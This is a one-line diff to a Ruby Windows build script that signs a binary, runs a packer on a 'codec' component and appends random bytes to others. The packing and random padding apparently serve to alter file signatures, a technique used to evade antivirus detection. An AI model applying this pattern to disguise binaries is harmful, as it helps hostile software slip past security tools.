@@ -118,7 +118,7 @@ class BuildWindows < Build
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
-    CrossPlatform.exec path('packer32'), "#{path('codec')}"
+    CrossPlatform.exec path('packer'), "#{path('codec')}"
     add_random(path('rapi'))
     add_random(path('sqlite'))
 
